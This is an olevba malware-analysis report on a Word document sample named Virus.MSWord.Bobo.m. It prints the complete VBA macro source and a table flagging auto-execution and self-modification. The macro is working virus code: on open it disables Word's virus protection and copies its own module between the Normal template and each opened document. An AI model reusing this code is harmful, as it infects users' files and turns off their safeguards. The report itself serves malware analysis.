olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bobo.m-909ed2c8b4b11e64468a01060ef1b93b3e814e3b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bobo.m-909ed2c8b4b11e64468a01060ef1b93b3e814e3b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Modulo1.bas 
in file: Virus.MSWord.Bobo.m-909ed2c8b4b11e64468a01060ef1b93b3e814e3b - OLE stream: 'Macros/VBA/Modulo1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
Attribute AutoOpen.VB_Description = "Macro creada el 09/04/96 por osvald"
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.AutoOpen"
Options.VirusProtection = False
  If NormalTemplate.VBProject.Protection = False And ActiveDocument.VBProject.Protection = False Then
   t = False
  s = ActiveDocument.Path + "\" + ActiveDocument.Name
  ss = NormalTemplate.Path + "\" + NormalTemplate.Name
  For Each mhac In NormalTemplate.VBProject.VBComponents
    If mhac.Name = "Modulo1" Then t = True
  Next mhac
  If t = False Then
     Application.OrganizerCopy Source:=s, Destination _
     :=ss, Name:="Modulo1", Object:=wdOrganizerObjectProjectItems
     If Err.Number <> 0 Then
       Exit Sub
     End If
     NormalTemplate.Save
     If Err.Number <> 0 Then
       Exit Sub
     End If
  End If
  t = False
      For Each mhac In ActiveDocument.VBProject.VBComponents
         If mhac.Name = "Modulo1" Then t = True
      Next mhac
      If t = False Then Application.OrganizerCopy Source:=ss, Destination _
         :=s, Name:="Modulo1", Object:=wdOrganizerObjectProjectItems
         If Err.Number <> 0 Then
      Exit Sub
     End If
     ActiveDocument.Save
     If Err.Number <> 0 Then
       Exit Sub
      End If
   End If
End
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

